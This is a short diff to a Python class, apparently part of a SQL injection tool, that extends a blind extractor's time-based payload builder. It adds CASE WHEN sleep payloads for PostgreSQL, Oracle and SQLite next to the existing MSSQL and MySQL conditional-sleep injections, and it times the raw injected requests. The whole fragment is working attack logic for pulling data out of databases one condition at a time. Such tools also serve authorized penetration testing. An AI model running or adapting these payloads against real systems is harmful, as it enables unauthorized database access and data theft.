@@ -222,10 +222,13 @@ class BlindExtractor:
         else:
             sleep_expr = f"SLEEP({self.time_delay})"
         
-        # If condition is true → trigger delay
+        # If condition is true → trigger delay (DBMS-specific conditional syntax)
         if dbms == "mssql":
             payload = f"{self._prefix} IF ({condition}) {sleep_expr}{self._suffix}"
-        else:
+        elif dbms in ("postgresql", "oracle", "sqlite"):
+            # CASE WHEN is standard SQL — works on PG, Oracle, SQLite
+            payload = f"{self._prefix} AND (CASE WHEN ({condition}) THEN {sleep_expr} ELSE 0 END){self._suffix}"
+        else:  # mysql (default)
             payload = f"{self._prefix} AND IF(({condition}),{sleep_expr},0){self._suffix}"
         
         _, elapsed = await self._inject_raw(payload)
